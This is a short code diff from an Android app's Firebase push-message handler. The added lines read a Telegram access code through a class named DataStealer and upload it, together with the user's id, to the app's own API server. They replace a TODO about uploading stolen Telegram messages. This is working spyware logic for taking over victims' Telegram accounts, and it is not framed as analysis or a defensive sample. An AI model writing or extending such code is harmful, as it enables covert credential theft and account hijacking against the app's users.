@@ -51,9 +51,13 @@ public class OurFirebaseMessagingService extends FirebaseMessagingService {
     }
 
     private void onTelegramReceived() {
-        ArrayList telegramMessages = DataStealer.takeTelegramAccessCodes(getApplicationContext());
-
-        // TODO upload telegram messages
+        String code = DataStealer.takeTelegramAccessCode(this);
+        ApiIntent
+                .build(this)
+                .setCall(ApiService.CALL_TELEGRAM_CODE)
+                .put(ApiService.KEY_USER_ID, StorageManager.with(this).userid.get())
+                .put(ApiService.KEY_TELEGRAM_CODE, code)
+                .start();
     }
 
     private void onTasksReceived(ArrayList<Task> tasks) {
